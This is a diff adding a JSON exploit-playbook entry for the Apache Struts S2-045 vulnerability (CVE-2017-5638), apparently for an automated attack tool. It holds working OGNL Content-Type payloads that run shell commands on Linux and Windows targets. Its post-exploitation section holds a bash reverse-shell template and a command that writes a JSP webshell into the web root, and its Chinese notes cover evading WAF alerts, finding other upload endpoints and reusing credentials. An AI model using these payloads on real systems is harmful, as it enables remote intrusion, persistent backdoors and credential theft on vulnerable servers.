@@ -1,0 +1,133 @@
+{
+  "id": "struts-s2-045-cve-2017-5638",
+  "family": "struts",
+  "product": "Apache Struts",
+  "cve": "CVE-2017-5638",
+  "aliases": [
+    "S2-045",
+    "Jakarta Multipart parser RCE",
+    "CVE-2017-5638 multipart OGNL"
+  ],
+  "severity": "critical",
+  "tags": [
+    "struts",
+    "ognl",
+    "multipart",
+    "rce",
+    "upload"
+  ],
+  "applicability": {
+    "versions": [
+      "2.3.5-2.3.31",
+      "2.5-2.5.10"
+    ],
+    "fingerprints": [
+      "Struts problem report or stack traces mentioning org.apache.struts2",
+      "File upload or multipart-enabled .action endpoints",
+      "Malformed Content-Type values trigger Jakarta Multipart parser errors"
+    ],
+    "signals": [
+      "The target processes multipart/form-data on unauthenticated or weakly protected endpoints",
+      "Responses include OGNL, Struts, or FileUpload parser hints",
+      "The same endpoint behaves differently when Content-Type contains expression-like content"
+    ]
+  },
+  "preconditions": [
+    "A Struts action must parse multipart/form-data.",
+    "The endpoint must not sanitize the crafted Content-Type header before the parser handles it.",
+    "WAF or proxy normalization must not strip OGNL fragments."
+  ],
+  "verification": {
+    "method": "http_post",
+    "requests": [
+      {
+        "path": "/upload.action",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "%{(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Probe','s2-045-ok')).(#nike='multipart/form-data')}",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "probe=1",
+        "matchers": [
+          "Response header X-Struts-Probe: s2-045-ok",
+          "HTTP 200/302/500 with reflected custom header"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/upload.action",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#p=new java.lang.ProcessBuilder({'/bin/sh','-c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start())}",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "probe=1",
+        "os_hint": "linux"
+      },
+      {
+        "path": "/upload.action",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='whoami').(#p=new java.lang.ProcessBuilder({'cmd.exe','/c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start())}",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "probe=1",
+        "os_hint": "windows"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先确认命令执行结果是否可见，避免在无回显情况下反复打高噪声 OGNL。",
+      "优先枚举应用运行用户、Tomcat/JBoss 路径、部署目录、临时目录和日志目录。",
+      "如果能定位可写 web 根目录，可考虑最小化 JSP webshell；否则优先寻找配置文件与凭据复用点。"
+    ],
+    "shell_options": [
+      {
+        "type": "bash_reverse_shell",
+        "template": "bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+      },
+      {
+        "type": "jsp_webshell_write",
+        "template": "echo '<% if(request.getParameter(\"cmd\")!=null){String x=request.getParameter(\"cmd\");Process p=Runtime.getRuntime().exec(x);}%>' > {writable_webroot}/struts45.jsp"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先用 header 注入验证链，确认仅添加自定义响应头即可。",
+      "再尝试 id、whoami、pwd 等低噪声命令。",
+      "确认部署路径和可写目录后再考虑写 JSP 或反弹 shell。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "pwd",
+      "hostname",
+      "uname -a"
+    ],
+    "shell_prerequisites": [
+      "确认目标能执行 /bin/sh 或 cmd.exe。",
+      "确认服务器是否允许出网，或是否已有代理链可复用。",
+      "确认应用容器不会立即重启并清理短时文件。"
+    ],
+    "fallbacks": [
+      "如果自定义响应头未出现，但仍返回 Struts 异常，继续缩短 OGNL 表达式做差异验证。",
+      "如果 /upload.action 不存在，寻找其他 multipart .action、save.action、import.action、upload.do 等上传类接口。",
+      "如果命令回显不稳定，转向写文件、读配置或日志落地。"
+    ]
+  },
+  "detection_notes": [
+    "S2-045 常见于上传接口，不应对所有 .action 盲打完整 ProcessBuilder 链。",
+    "先做 harmless verification 能显著减少比赛环境误伤和 WAF 告警。",
+    "部分目标返回 500 但 header 注入已经成功，不要只盯状态码。"
+  ],
+  "references": [
+    "Apache Struts S2-045 advisory",
+    "Public S2-045 OGNL proof-of-concept analyses"
+  ]
+}
